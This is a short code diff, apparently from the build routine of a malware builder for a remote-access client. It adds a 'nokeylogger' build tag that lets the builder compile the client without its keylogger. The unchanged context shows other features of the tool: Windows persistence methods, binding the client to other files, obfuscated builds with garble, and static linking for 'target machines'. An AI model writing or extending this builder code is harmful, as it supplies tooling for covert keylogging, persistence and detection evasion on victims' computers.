@@ -852,6 +852,9 @@ func runBoundFiles() {
       if (config.noPrinting) {
         sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
       }
+      if (config.disableKeylogger) {
+        sendToStream({ type: "output", text: "Keylogger disabled (nokeylogger tag)\n", level: "info" });
+      }
 
       // Linux CGO builds must be fully statically linked to avoid glibc version
       // mismatches between the build server and target machines.
@@ -865,6 +868,7 @@ func runBoundFiles() {
         const buildTool = config.obfuscate ? "garble" : "go";
         const buildTags: string[] = [];
         if (config.noPrinting) buildTags.push("noprint");
+        if (config.disableKeylogger) buildTags.push("nokeylogger");
         if (hasBoundFiles) buildTags.push("hasbinder");
         if (config.enablePersistence && os === "windows") {
           const methods = config.persistenceMethods && config.persistenceMethods.length > 0
